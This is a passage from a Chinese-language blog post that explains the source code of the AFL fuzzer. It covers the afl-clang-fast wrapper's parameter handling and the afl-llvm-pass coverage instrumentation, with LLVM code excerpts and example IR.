as_params);</code><ul><li>这其实是因为我们的execvp执行的时候，会用<code>as_params[0]</code>来完全替换掉当前进程空间中的程序，如果不通过子进程来执行实际的as，那么后续就无法在执行完实际的as之后，还能unlink掉modified_file</li><li><a href="https://www.cnblogs.com/mickole/p/3187409.html" target="_blank" rel="noopener">exec系列函数</a></li><li><a href="https://blog.csdn.net/THEONE10211024/article/details/13774669" target="_blank" rel="noopener">fork出的子进程和父进程</a></li></ul></li><li><code>waitpid(pid, &amp;status, 0)</code>等待子进程结束</li><li>读取环境变量AFL_KEEP_ASSEMBLY的值，如果没有设置这个环境变量，就unlink掉modified_file。</li></ul><p>稍微打印一下参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(as_params); i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"as_params[%d]:%s\n"</span>, i, as_params[i]);</span><br><span class="line">&#125;</span><br><span class="line">    ...</span><br><span class="line">[+] Instrumented <span class="number">5</span> locations (<span class="number">64</span>-<span class="built_in">bit</span>, non-hardened mode, ratio <span class="number">100</span>%).</span><br><span class="line">as_params[<span class="number">0</span>]:as</span><br><span class="line">as_params[<span class="number">1</span>]:/Users/sakura/gitsource/AFL/cmake-build-debug/tmp/afl<span class="number">-8427</span><span class="number">-1595314986.</span>s</span><br></pre></td></tr></table></figure><h2 id="afl-fast-clang中叙"><a href="#afl-fast-clang中叙" class="headerlink" title="afl-fast-clang中叙"></a>afl-fast-clang中叙</h2><p>因为AFL对于上述通过<code>afl-gcc</code>来插桩这种做法已经属于不建议，并提供了更好的工具afl-clang-fast，通过llvm pass来插桩。</p><h3 id="clang-wrapper"><a href="#clang-wrapper" class="headerlink" title="clang wrapper"></a>clang wrapper</h3><p><code>afl-clang-fast.c</code>这个文件其实是clang的一层wrapper，和之前的<code>afl-gcc</code>一样，只是定义了一些宏，和传递了一些参数给真正的clang。<br>我们还是依次来看一下核心函数。</p><h4 id="find-obj"><a href="#find-obj" class="headerlink" title="find_obj"></a>find_obj</h4><ul><li>获取环境变量<code>AFL_PATH</code>的值，如果存在，就去读取<code>AFL_PATH/afl-llvm-rt.o</code>是否可以访问，如果可以就设置这个目录为<code>obj_path</code>，然后直接返回</li><li>如果没有设置这个环境变量，就检查arg0中是否存在<code>/</code>，例如我们可能是通过<code>/home/sakura/AFL/afl-clang-fast</code>去调用afl-clang-fast的，所以它此时就认为最后一个<code>/</code>之前的<code>/home/sakura/AFL</code>是AFL的根目录，然后读取其下的<code>afl-llvm-rt.o</code>文件，看是否能够访问，如果可以就设置这个目录为<code>obj_path</code>，然后直接返回。</li><li>最后如果上面两种都找不到，因为默认的AFL的MakeFile在编译的时候，会定义一个名为<code>AFL_PATH</code>的宏，其指向<code>/usr/local/lib/afl</code>,会到这里找是否存在<code>afl-llvm-rt.o</code>，如果存在设置<code>obj_path</code>并直接返回。</li><li>如果上述三种方式都找不到，那么就会抛出异常<code>Unable to find &#39;afl-llvm-rt.o&#39; or &#39;afl-llvm-pass.so&#39;. Please set AFL_PATH</code></li></ul><h4 id="edit-params-2"><a href="#edit-params-2" class="headerlink" title="edit_params"></a>edit_params</h4><ul><li>首先根据我们执行的是<code>afl-clang-fast</code>还是<code>afl-clang-fast++</code>来决定<code>cc_params[0]</code>的值是clang++还是clang。<ul><li>如果执行的是<code>afl-clang-fast++</code>，读取环境变量<code>AFL_CXX</code>，如果存在，就将其值设置为<code>cc_params[0]</code>，如果不存在，就直接设置成<code>clang++</code></li><li>如果执行的是<code>afl-clang-fast</code>，读取环境变量<code>AFL_CC</code>，如果存在，就将其值设置为<code>cc_params[0]</code>，如果不存在，就直接设置成<code>clang</code></li></ul></li><li>默认情况下，我们通过<code>afl-llvm-pass.so</code>来注入instrumentation，但是现在也支持<code>trace-pc-guard</code>模式，可以参考<a href="http://clang.llvm.org/docs/SanitizerCoverage.html#tracing-pcs-with-guards" target="_blank" rel="noopener">llvm的文档</a></li><li>然后如果定义了<code>USE_TRACE_PC</code>宏，就将<code>-fsanitize-coverage=trace-pc-guard -mllvm -sanitizer-coverage-block-threshold=0</code>添加到参数里</li><li>如果没有定义，就依次将<code>-Xclang -load -Xclang obj_path/afl-llvm-pass.so -Qunused-arguments</code></li><li>依次读取我们传给<code>afl-clang-fast</code>的参数，并添加到cc_params里，不过这里会做一些检查和设置。<ul><li>如果传入参数里有<code>-m32</code>或者<code>armv7a-linux-androideabi</code>，就设置<code>bit_mode</code>为32</li><li>如果传入参数里有<code>-m64</code>，就设置<code>bit_mode</code>为64</li><li>如果传入参数里有<code>-x</code>，就设置<code>x_set</code>为1</li><li>如果传入参数里有<code>-fsanitize=address</code>或者<code>-fsanitize=memory</code>，就设置asan_set为1</li><li>如果传入参数里有<code>-Wl,-z,defs</code>或者<code>-Wl,--no-undefined</code>，就直接pass掉，不传给clang。</li></ul></li><li>读取环境变量<code>AFL_HARDEN</code>，如果存在，就在cc_params里添加<code>-fstack-protector-all</code></li><li>如果参数里没有<code>-fsanitize=address/memory</code>，即asan_set是0，就读取环境变量<code>AFL_USE_ASAN</code>，如果存在就添加<code>-fsanitize=address</code>到cc_params里，环境变量<code>AFL_USE_MSAN</code>同理</li><li>如果定义了<code>USE_TRACE_PC</code>宏，就检查是否存在环境变量<code>AFL_INST_RATIO</code>，如果存在就抛出异常<code>AFL_INST_RATIO not available at compile time with &#39;trace-pc&#39;.</code></li><li>读取环境变量<code>AFL_DONT_OPTIMIZE</code>，如果<strong>不存在</strong>就添加<code>-g -O3 -funroll-loops</code>到参数里</li><li>读取环境变量<code>AFL_NO_BUILTIN</code>，如果存在就添加<code>-fno-builtin-strcmp</code>等。</li><li>添加参数<code>-D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code>，定义一些宏</li><li>这里定义了如下两个宏<code>__AFL_LOOP</code>,<code>__AFL_INIT()</code>,宏展开是类似这样的，为简化我去掉了和编译器优化相关的东西。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __AFL_LOOP() \</span></span><br><span class="line">  <span class="keyword">do</span> &#123; \</span><br><span class="line">      <span class="keyword">static</span> <span class="keyword">char</span> *_B; \</span><br><span class="line">      _B = (<span class="keyword">char</span>*)<span class="string">"##SIG_AFL_PERSISTENT##"</span>; \</span><br><span class="line">      __afl_persistent_loop(); \</span><br><span class="line">  &#125;<span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __AFL_INIT() \</span></span><br><span class="line">  <span class="keyword">do</span> &#123; \</span><br><span class="line">      <span class="keyword">static</span> <span class="keyword">char</span> *_A;  \</span><br><span class="line">      _A = (<span class="keyword">char</span>*)<span class="string">"##SIG_AFL_DEFER_FORKSRV##"</span>; \</span><br><span class="line">      __afl_manual_init(); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li>如果x_set为1，则添加参数<code>-x none</code></li><li>根据<code>bit_mode</code>的值选择<code>afl-llvm-rt</code><ul><li>如果为0，即没有<code>-m32</code>和<code>-m64</code>选项，就向参数里添加<code>obj_path/afl-llvm-rt.o</code></li><li>如果为32，添加<code>obj_path/afl-llvm-rt-32.o</code></li><li>如果为64，添加<code>obj_path/afl-llvm-rt-64.o</code></li></ul></li></ul><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><ul><li>寻找obj_path路径</li><li>编辑参数cc_params</li><li>替换进程空间，执行要调用的clang和为其传递参数<ul><li><code>execvp(cc_params[0], (char**)cc_params);</code><h3 id="afl-llvm-pass"><a href="#afl-llvm-pass" class="headerlink" title="afl-llvm-pass"></a>afl-llvm-pass</h3>关于llvm不懂的可以看CSCD70，顺便可以学一下优化，这里放一下我之前抽空做的<a href="https://github.com/eternalsakura/sakura_llvm_opt" target="_blank" rel="noopener">笔记</a>, 以及<a href="https://blog.csdn.net/qq_23599965/article/details/88538590" target="_blank" rel="noopener">这篇文章</a>可以列为查询和参考.<br>afl-llvm-pass里只有一个Transform pass AFLCoverage，其继承自ModulePass，所以我们主要分析一下它的<code>runOnModule</code>函数，这里简单的介绍一下llvm里的一些层次关系，粗略理解就是Module相当于你的程序，里面包含所有Function和全局变量，而Function里包含所有BasicBlock和函数参数，BasicBlock里包含所有Instruction,Instruction包含Opcode和Operands。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-08-03-083346.png" alt=""><h4 id="注册pass"><a href="#注册pass" class="headerlink" title="注册pass"></a>注册pass</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">registerAFLPass</span><span class="params">(<span class="keyword">const</span> PassManagerBuilder &amp;,</span></span></span><br><span class="line"><span class="function"><span class="params">                            legacy::PassManagerBase &amp;PM)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  PM.add(<span class="keyword">new</span> AFLCoverage());</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">RegisterAFLPass</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PassManagerBuilder::EP_ModuleOptimizerEarly, registerAFLPass)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">RegisterAFLPass0</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PassManagerBuilder::EP_EnabledOnOptLevel0, registerAFLPass)</span></span>;</span><br></pre></td></tr></table></figure>这些都是向PassManager来注册新的pass，每个pass彼此独立，通过PM统一注册和调度，更加模块化。<br>具体的可以参考定义，我摘取了必要的代码和注释，请仔细阅读。<br>简单的理解就是当我创建了一个类RegisterStandardPasses之后，就会调用它的构造函数，然后调用<code>PassManagerBuilder::addGlobalExtension</code>，这是一个静态函数，这个函数会创建一个tuple保存<strong>Ty和Fn还有一个id</strong>，并将其添加到一个静态全局vector里，以供PassManagerBuilder在需要的时候，将其添加到PM里。<br>而这个添加的时机就是<code>ExtensionPointTy</code>来指定的。</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// Registers a function for adding a standard set of passes.  This should be</span></span><br><span class="line"><span class="comment">/// used by optimizer plugins to allow all front ends to transparently use</span></span><br><span class="line"><span class="comment">/// them.  Create a static instance of this class in your plugin, providing a</span></span><br><span class="line"><span class="comment">/// private function that the PassManagerBuilder can use to add your passes.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterStandardPasses</span> &#123;</span></span><br><span class="line">  PassManagerBuilder::GlobalExtensionID ExtensionID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  RegisterStandardPasses(PassManagerBuilder::ExtensionPointTy Ty,</span><br><span class="line">                         PassManagerBuilder::ExtensionFn Fn) &#123;</span><br><span class="line">    ExtensionID = PassManagerBuilder::addGlobalExtension(Ty, <span class="built_in">std</span>::<span class="built_in">move</span>(Fn));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~RegisterStandardPasses() &#123;</span><br><span class="line">  ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="comment">/// PassManagerBuilder - This class is used to set up a standard optimization</span></span><br><span class="line"><span class="comment">/// sequence for languages like C and C++, allowing some APIs to customize the</span></span><br><span class="line"><span class="comment">/// pass sequence in various ways. A simple example of using it would be:</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">///  PassManagerBuilder Builder;</span></span><br><span class="line"><span class="comment">///  Builder.OptLevel = 2;</span></span><br><span class="line"><span class="comment">///  Builder.populateFunctionPassManager(FPM);</span></span><br><span class="line"><span class="comment">///  Builder.populateModulePassManager(MPM);</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// In addition to setting up the basic passes, PassManagerBuilder allows</span></span><br><span class="line"><span class="comment">/// frontends to vend a plugin API, where plugins are allowed to add extensions</span></span><br><span class="line"><span class="comment">/// to the default pass manager.  They do this by specifying where in the pass</span></span><br><span class="line"><span class="comment">/// pipeline they want to be added, along with a callback function that adds</span></span><br><span class="line"><span class="comment">/// the pass(es).  For example, a plugin that wanted to add a loop optimization</span></span><br><span class="line"><span class="comment">/// could do something like this:</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// static void addMyLoopPass(const PMBuilder &amp;Builder, PassManagerBase &amp;PM) &#123;</span></span><br><span class="line"><span class="comment">///   if (Builder.getOptLevel() &gt; 2 &amp;&amp; Builder.getOptSizeLevel() == 0)</span></span><br><span class="line"><span class="comment">///     PM.add(createMyAwesomePass());</span></span><br><span class="line"><span class="comment">/// &#125;</span></span><br><span class="line"><span class="comment">///   ...</span></span><br><span class="line"><span class="comment">///   Builder.addExtension(PassManagerBuilder::EP_LoopOptimizerEnd,</span></span><br><span class="line"><span class="comment">///                        addMyLoopPass);</span></span><br><span class="line"><span class="comment">///   ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PassManagerBuilder</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">/// Extensions are passed to the builder itself (so they can see how it is</span></span><br><span class="line">  <span class="comment">/// configured) as well as the pass manager to add stuff to.</span></span><br><span class="line">  <span class="keyword">typedef</span> <span class="built_in">std</span>::function&lt;<span class="keyword">void</span>(<span class="keyword">const</span> PassManagerBuilder &amp;Builder,</span><br><span class="line">                             legacy::PassManagerBase &amp;PM)&gt;</span><br><span class="line">      ExtensionFn;</span><br><span class="line">  <span class="keyword">typedef</span> <span class="keyword">int</span> GlobalExtensionID;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">enum</span> ExtensionPointTy &#123;</span><br><span class="line">    <span class="comment">/// EP_ModuleOptimizerEarly - This extension point allows adding passes</span></span><br><span class="line">    <span class="comment">/// just before the main module-level optimization passes.</span></span><br><span class="line">    EP_ModuleOptimizerEarly,</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/// EP_EnabledOnOptLevel0 - This extension point allows adding passes that</span></span><br><span class="line">    <span class="comment">/// should not be disabled by O0 optimization level. The passes will be</span></span><br><span class="line">    <span class="comment">/// inserted after the inlining pass.</span></span><br><span class="line">    EP_EnabledOnOptLevel0,</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">  <span class="comment">/// Adds an extension that will be used by all PassManagerBuilder instances.</span></span><br><span class="line">  <span class="comment">/// This is intended to be used by plugins, to register a set of</span></span><br><span class="line">  <span class="comment">/// optimisations to run automatically.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// \returns A global extension identifier that can be used to remove the</span></span><br><span class="line">  <span class="comment">/// extension.</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> GlobalExtensionID <span class="title">addGlobalExtension</span><span class="params">(ExtensionPointTy Ty,</span></span></span><br><span class="line"><span class="function"><span class="params">                                              ExtensionFn Fn)</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">/// PassManagerBase - An abstract interface to allow code to add passes to</span></span><br><span class="line"><span class="comment">/// a pass manager without having to hard-code what kind of pass manager</span></span><br><span class="line"><span class="comment">/// it is.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PassManagerBase</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~PassManagerBase();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// Add a pass to the queue of passes to run.  This passes ownership of</span></span><br><span class="line">  <span class="comment">/// the Pass to the PassManager.  When the PassManager is destroyed, the pass</span></span><br><span class="line">  <span class="comment">/// will be destroyed as well, so there is no need to delete the pass.  This</span></span><br><span class="line">  <span class="comment">/// may even destroy the pass right away if it is found to be redundant. This</span></span><br><span class="line">  <span class="comment">/// implies that all passes MUST be allocated with 'new'.</span></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Pass *P)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="runOnModule"><a href="#runOnModule" class="headerlink" title="runOnModule"></a>runOnModule</h4><ul><li>通过getContext来获取LLVMContext，其保存了整个程序里分配的类型和常量信息。</li><li>通过这个Context来获取type实例Int8Ty和Int32Ty<ul><li>Type是所有type类的一个超类。<strong>每个Value都有一个Type</strong>，所以这经常被用于寻找指定类型的Value。Type不能直接实例化，只能通过其子类实例化。某些基本类型(VoidType、LabelType、FloatType和DoubleType)有隐藏的子类。之所以隐藏它们，是因为除了Type类提供的功能之外，它们没有提供任何有用的功能，除了将它们与Type的其他子类区分开来之外。所有其他类型都是DerivedType的子类。Types可以被命名，但这不是必需的。一个给定Type在任何时候都只存在一个实例。这允许使用Type实例的地址相等来执行type相等。也就是说，给定两个Type*值，如果指针相同，则types相同。</li></ul></li><li>读取环境变量AFL_INST_RATIO给变量inst_ratio，其值默认为100，这个值代表一个插桩概率，本来应该每个分支都必定插桩，而这是一个随机的概率决定是否要在这个分支插桩。</li><li>获取全局变量中指向共享内存的指针，以及上一个基础块的编号<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GlobalVariable *AFLMapPtr =</span><br><span class="line">        <span class="keyword">new</span> GlobalVariable(M, PointerType::<span class="built_in">get</span>(Int8Ty, <span class="number">0</span>), <span class="literal">false</span>,</span><br><span class="line">                            GlobalValue::ExternalLinkage, <span class="number">0</span>, <span class="string">"__afl_area_ptr"</span>);</span><br><span class="line"></span><br><span class="line">GlobalVariable *AFLPrevLoc = <span class="keyword">new</span> GlobalVariable(</span><br><span class="line">        M, Int32Ty, <span class="literal">false</span>, GlobalValue::ExternalLinkage, <span class="number">0</span>, <span class="string">"__afl_prev_loc"</span>,</span><br><span class="line">        <span class="number">0</span>, GlobalVariable::GeneralDynamicTLSModel, <span class="number">0</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></li><li>遍历每个基本块，找到此基本块中适合插入instrument的位置，后续通过初始化IRBuilder的一个实例进行插入。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BasicBlock::iterator IP &#x3D; BB.getFirstInsertionPt();</span><br><span class="line">IRBuilder&lt;&gt; IRB(&amp;(*IP));</span><br></pre></td></tr></table></figure></li><li>随机创建一个当前基本块的编号，并通过插入load指令来获取前一个基本块的编号。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cur_loc = AFL_R(MAP_SIZE);</span><br><span class="line">ConstantInt *CurLoc = ConstantInt::<span class="built_in">get</span>(Int32Ty, cur_loc);</span><br><span class="line">LoadInst *PrevLoc = IRB.CreateLoad(AFLPrevLoc);</span><br><span class="line">PrevLoc-&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br><span class="line">Value *PrevLocCasted = IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());</span><br></pre></td></tr></table></figure></li><li>通过插入load指令来获取共享内存的地址，并通过CreateGEP函数来获取共享内存里指定index的地址，这个index通过cur_loc和prev_loc取xor计算得到。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadInst *MapPtr = IRB.CreateLoad(AFLMapPtr);</span><br><span class="line">MapPtr-&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br><span class="line">Value *MapPtrIdx =</span><br><span class="line">        IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));</span><br></pre></td></tr></table></figure></li><li>通过插入load指令来读取对应index地址的值，并通过插入add指令来将其加一，然后通过创建store指令将新值写入，更新共享内存。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoadInst *Counter = IRB.CreateLoad(MapPtrIdx);</span><br><span class="line">Counter-&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br><span class="line">Value *Incr = IRB.CreateAdd(Counter, ConstantInt::<span class="built_in">get</span>(Int8Ty, <span class="number">1</span>));</span><br><span class="line">IRB.CreateStore(Incr, MapPtrIdx)</span><br><span class="line">        -&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br></pre></td></tr></table></figure></li><li>将当前cur_loc的值右移一位，然后通过插入store指令，更新<code>__afl_prev_loc</code>的值。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StoreInst *Store = IRB.CreateStore(ConstantInt::<span class="built_in">get</span>(Int32Ty, cur_loc &gt;&gt; <span class="number">1</span>), AFLPrevLoc);</span><br><span class="line">Store-&gt;setMetadata(M.getMDKindID(<span class="string">"nosanitize"</span>), MDNode::<span class="built_in">get</span>(C, None));</span><br></pre></td></tr></table></figure></li><li>总结<br>总的来说就是通过遍历每个基本块，向其中插入实现了如下伪代码功能的instruction ir来进行插桩。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;; </span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>看一个例子</li><li>源程序<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">8</span>) &lt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hum?\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">'0'</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Looks like a zero to me!\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"A non-zero value? How quaint!\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>插桩前的ir<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;nopt_test-instr.ll&#39;</span><br><span class="line">source_filename &#x3D; &quot;test-instr.c&quot;</span><br><span class="line">target datalayout &#x3D; &quot;e-m:o-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple &#x3D; &quot;x86_64-apple-macosx10.15.0&quot;</span><br><span class="line"></span><br><span class="line">@.str &#x3D; private unnamed_addr constant [6 x i8] c&quot;Hum?\0A\00&quot;, align 1</span><br><span class="line">@.str.1 &#x3D; private unnamed_addr constant [26 x i8] c&quot;Looks like a zero to me!\0A\00&quot;, align 1</span><br><span class="line">@.str.2 &#x3D; private unnamed_addr constant [31 x i8] c&quot;A non-zero value? How quaint!\0A\00&quot;, align 1</span><br><span 